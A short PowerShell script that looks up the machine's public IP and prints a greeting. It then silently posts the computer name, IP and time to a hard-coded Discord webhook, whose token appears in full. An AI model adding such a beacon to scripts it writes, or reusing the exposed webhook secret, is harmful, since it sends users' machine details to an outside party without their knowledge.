param (
  [string]$var1
)

$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
$IP = Invoke-WebRequest("ifconfig.me")
$cTime = Get-Date -Format "MM/dd - HH:mm:ss"

Write-Output "Hello, $Env:ComputerName!"
Write-Output "IP: $IP"
Write-Output "Variable: $var1"

$msg = @{
    content = "Script has been run on $Env:ComputerName with IP $IP at $cTime."
} | ConvertTo-Json

Invoke-WebRequest -Uri $URL -Method Post -Body $msg -ContentType "application/json" | Out-Null
